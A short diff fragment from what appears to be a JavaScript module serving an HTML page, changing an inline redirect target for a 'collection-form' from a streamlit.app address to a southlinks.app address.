@@ -50,7 +50,7 @@ export default {
             <meta charset="utf-8">
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <script>
-                window.location.href = 'https://collection-form.streamlit.app';
+                window.location.href = 'https://collection-form.southlinks.app';
             </script>
         </head>
         <body>
